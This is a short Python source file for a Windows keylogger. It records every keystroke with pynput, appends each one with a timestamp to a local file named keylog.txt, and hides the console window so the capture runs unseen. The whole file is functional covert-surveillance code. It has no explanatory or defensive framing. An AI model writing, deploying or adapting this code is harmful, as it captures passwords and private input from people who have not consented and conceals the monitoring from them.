from pynput.keyboard import Key, Listener
import logging
import pythoncom
import win32gui
import win32con


log_file = "keylog.txt"


logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')


def on_press(key):
    logging.info(str(key))


def on_release(key):
    if key == Key.esc:
        return False


def hide_console():
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)


def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        hide_console()  
        listener.join()


if __name__ == "__main__":
    pythoncom.CoInitialize()  
    start_keylogger()
